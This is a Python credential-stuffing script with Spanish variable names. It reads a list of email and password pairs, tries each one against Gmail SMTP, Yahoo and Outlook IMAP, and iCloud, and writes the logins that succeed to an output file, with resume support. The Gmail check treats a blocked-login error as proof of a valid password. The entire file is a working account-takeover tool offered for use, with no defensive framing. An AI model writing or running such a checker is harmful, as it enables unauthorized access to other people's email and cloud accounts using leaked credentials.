#!/usr/bin/python
import os
import sys
import threading
import imaplib
import smtplib
from pyicloud import PyiCloudService
from eliminar import eliminarRepetidos
import signal

def checklogin(email, contra, f, num):
    num[0] += 1
    posC = email.find("@gmail.com")
    posY = email.find("@yahoo.com")
    if "--icloud" in sys.argv:
        if(checkLoginiCloud(email,contra)):
            print("Exito iCloud :) email:{0} password:{1}".format(email, contra))
            f.write("\niCloud email:{0} password:{1}".format(email, contra))
        else:
            pass
            print("no Exito :( email:{0} password:{1}".format(email, contra))

    if "--email" in sys.argv:
        if posC != -1:
            if (checkLoginGmail(email, contra)):
                print("Exito G :) email:{0} password:{1}".format(email, contra))
                f.write("\nemail:{0} password:{1}".format(email, contra))
            else:
                pass
                print("no Exito :( email:{0} password:{1}".format(email, contra))
        elif posY != -1:
            if (checkLoginYahoo(email, contra)):
                print("Exito Y :) email:{0} password:{1}".format(email, contra))
                f.write("\nemail:{0} password:{1}".format(email, contra))
            else:
                pass
                print("no Exito :( email:{0} password:{1}".format(email, contra))
        else:
            if (checkLoginMS(email, contra)):
                print("Exito M :) email:{0} password:{1}".format(email, contra))
                f.write("\nemail:{0} password:{1}".format(email, contra))
            else:
                pass
                print("no Exito :( email:{0} password:{1}".format(email, contra))
        num[0] -= 1


def checkLoginYahoo(email, contra):
    server = imaplib.IMAP4_SSL("imap.mail.yahoo.com", 993)
    try:
        server.login(email, contra)
        return True
    except:
        return False


def checkLoginGmail(email, contra):
	smtpserver = smtplib.SMTP_SSL('smtp.gmail.com', 465)
	smtpserver.ehlo()
	gmail_user = email
	gmail_pwd = contra
	try:
		smtpserver.login(gmail_user, gmail_pwd)
		return True
	except Exception as e:
		codigo = str(e)[1:].split(',')[0]
		#print(str(e))
		#print(codigo)
		if codigo == '534' and len(str(e)[1:].split(',')[1]) > 200:
			return True
		return False



def checkLoginMS(email, contra):
    server = imaplib.IMAP4_SSL("imap-mail.outlook.com", 993)
    try:
        server.login(email, contra)
        return True
    except:
        return False

def checkLoginiCloud(email,contra):
    try:
        PyiCloudService(email,contra)
        return True
    except:
        return False
        
salida = False

def salir(signum, frame):
    global salida
    salida = True
    sys.exit()
 
signal.signal(signal.SIGINT, salir)


if __name__ == "__main__":
    if "-O" in sys.argv:
        save = sys.argv[sys.argv.index("-O") + 1]+".sav"
        outputTXT = sys.argv[sys.argv.index("-O") + 1]+".txt"
    if "-I" in sys.argv:
        inputTXT = sys.argv[sys.argv.index("-I") + 1]
        #eliminarRepetidos(inputTXT)
    flag = True
    lineaSav = None
    if os.path.isfile(save):
        sav = open(save, "r")
        lineaSav = sav.readline().strip("\n")
        flag = False
        if lineaSav == "":
            flag = True
        sav.close()
    else:
        open(save, "w")
    fil = open(inputTXT, "r")
    datos = open(outputTXT, "a")
    lineas = fil.read().split('\n')
    fichero = open(inputTXT, 'r')
    numLineas = len(fichero.readlines())
    lineasActuales = 0
    num = [0]
    for linea in lineas:
        if salida == False:
            try:
                if flag and linea != "":
                    lineaRaw = linea
                    linea = linea.split(',')
                    email = linea[0]
                    contras = linea[1:]
                    if len(contras) > 1:
                        if linea[1] not in linea[2:]:
                            for contra in contras:
                                checklogin(email, contra, datos, num)
                        else:
                            contra = linea[1]
                            checklogin(email, contra, datos, num)
                    else:
                        contra = linea[1]
                        checklogin(email, contra, datos, num)
                    sav = open(save, "w")
                    sav.write(lineaRaw)
                    sav.close()
                if linea == lineaSav and linea != "":
                    flag = True
            except Exception as e:
                print("Excepcion Dura "+str(e))
            finally:
                lineasActuales += 1
                print("%{0}".format(float((100/numLineas)*lineasActuales)))
        else:
            break
    eliminarRepetidos(outputTXT)
